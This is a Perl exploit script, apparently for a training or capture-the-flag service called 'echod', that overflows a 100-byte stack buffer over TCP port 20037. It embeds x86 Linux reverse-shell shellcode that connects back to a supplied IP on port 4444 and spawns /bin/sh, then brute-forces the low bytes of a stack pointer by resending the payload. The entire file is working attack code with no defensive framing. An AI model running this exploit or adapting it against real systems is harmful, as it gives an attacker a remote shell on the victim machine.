#!/usr/bin/env perl
use strict;
use warnings;
use IO::Socket;
use POSIX qw(dup2);

sub inet_addr {
    my $addr = shift;
    $addr =~ s/^\s+//;
    $addr =~ s/\s+$//;
    my @bytes = split/\./, $addr;
    my $rv = 0;
    while(@bytes) {
        $rv <<= 8;
        $rv |= shift @bytes;
    }
    return $rv;
}

my $myip;
$myip = shift if @ARGV;
$myip ||= "127.0.0.1";

my $target = shift || "localhost";

my $shellcode =
   "\x81\xec\x38\xff\xff\xff"
  . "\x31\xc0\x50\x31\xdb\xb3\x01\x53\x6a\x02"
  . "\xb0\x66\x89\xe1\xcd\x80\x68"
  . pack("N", inet_addr($myip))
  . "\x66\x68"
  . pack("n", 4444)
  . "\x66\x6a\x02\x89\xe1\x6a\x10\x51\x50\x31\xc0\xb0\x66"
  . "\xb3\x03\x89\xe1\xcd\x80\x5b\x31\xc9\xb0\x3f\xcd\x80\x41"
  . "\xb0\x3f\xcd\x80\xb8\xaa\x2f\x73\x68\xc1\xe8\x08\x50\x68"
  . "\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\x89\xd0"
  . "\x04\x0b\xcd\x80";

my $jmp = "\xeb";

my $reta = pack("V", 0x804857a);


my $buff = "";
my $LEN = 100;
#         <-----100 byte buffer-----><------------ overflow ------------>
# buff is <NOPS>$shellcode \xEA[-100]PADDPADDPADD[&RET][&RET]\x0[byte-3]

$buff .= $shellcode;
$buff .= "\x90" x ($LEN - 4 - length($shellcode));
$buff .= $jmp . pack("c", -98);
$buff .= "xx";

warn length $buff;

$buff .= "PADD" x 3;
$buff .= $reta x 2;

my $lownibble;

# Expand this if the stack is not 16-byte aligned.
my @lownibbles = (0xC);

for my $byte (reverse(0x4 .. 0xF)) {
    printf "Try 0x%02x ...\n", $byte;
    for $lownibble (@lownibbles) {
        my $send = $buff;
        $send .= pack("C", (($byte - 4) << 4) | $lownibble);
        sendBuf($send);
    }
}

print "Trying longer brute-force.\n";

for my $b2 (reverse(0x00 .. 0xFF)) {
    printf "Try 2LSB 0x%02x ...\n", $b2;
    for my $byte (reverse(0x0 .. 0xF)) {
        for $lownibble (@lownibbles) {
            my $send = $buff;
            $send .= pack("C", ($byte << 4) | $lownibble);
            $send .= pack("C", $b2);
            sendBuf($send);
        }
    }
}

sub sendBuf {
    my $send = shift;
    
    my $socket = IO::Socket->new(
        Domain   => AF_INET,
        PeerAddr => $target,
        PeerPort => "20037",
        Proto    => 'tcp'
    );
    die("Unable to connect -- is echod running?") unless $socket;

    $socket->write( $send, length($send) );
}
